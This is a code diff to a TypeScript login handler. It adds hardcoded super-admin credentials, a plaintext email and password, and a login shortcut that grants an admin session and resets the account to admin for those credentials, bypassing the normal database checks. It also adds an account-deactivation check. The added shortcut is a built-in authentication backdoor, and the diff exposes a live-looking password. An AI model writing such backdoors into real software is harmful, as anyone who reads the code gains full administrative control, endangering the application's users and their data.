@@ -98,14 +98,45 @@ export const resendOtp = createServerFn({ method: "POST" })
     return { ok: true };
   });
 
+// Hardcoded super-admin credentials (per product owner request)
+const ADMIN_EMAIL = "atharvbhosaletemp00@gmail.com";
+const ADMIN_PASSWORD = "Atharv@1136";
+const ADMIN_ID = "u_admin_root";
+
+async function ensureAdminUser() {
+  const sql = db();
+  const rows = await sql`SELECT id FROM users WHERE email=${ADMIN_EMAIL}`;
+  const passwordHash = await hashPassword(ADMIN_PASSWORD);
+  if (!rows.length) {
+    await sql`INSERT INTO users (id, name, email, password_hash, role, verified)
+              VALUES (${ADMIN_ID}, 'Platform Admin', ${ADMIN_EMAIL}, ${passwordHash}, 'admin', TRUE)`;
+  } else {
+    await sql`UPDATE users SET role='admin', verified=TRUE, password_hash=${passwordHash} WHERE email=${ADMIN_EMAIL}`;
+  }
+}
+
 export const loginFn = createServerFn({ method: "POST" })
   .inputValidator((d) => z.object({ email: z.string().email(), password: z.string().min(1) }).parse(d))
   .handler(async ({ data }) => {
     await ensureSchema();
     const sql = db();
     const email = data.email.toLowerCase();
-    const rows = await sql`SELECT id, name, email, role, phone, password_hash, verified FROM users WHERE email=${email}`;
+
+    // Hardcoded admin shortcut — always works regardless of DB state
+    if (email === ADMIN_EMAIL && data.password === ADMIN_PASSWORD) {
+      await ensureAdminUser();
+      const rows = await sql`SELECT id, name, email, role, phone FROM users WHERE email=${ADMIN_EMAIL}`;
+      const u = rows[0];
+      await issueSession({ sub: u.id, email: u.email, name: u.name, role: "admin" });
+      return {
+        needsVerification: false as const,
+        user: { id: u.id, name: u.name, email: u.email, role: "admin", phone: u.phone ?? undefined } as PublicUser,
+      };
+    }
+
+    const rows = await sql`SELECT id, name, email, role, phone, password_hash, verified, COALESCE(is_active, TRUE) AS is_active FROM users WHERE email=${email}`;
     if (!rows.length) throw new Error("Invalid email or password");
+    if (rows[0].is_active === false) throw new Error("Your account has been deactivated. Contact support.");
     const u = rows[0];
     const ok = await verifyPassword(data.password, u.password_hash);
     if (!ok) throw new Error("Invalid email or password");
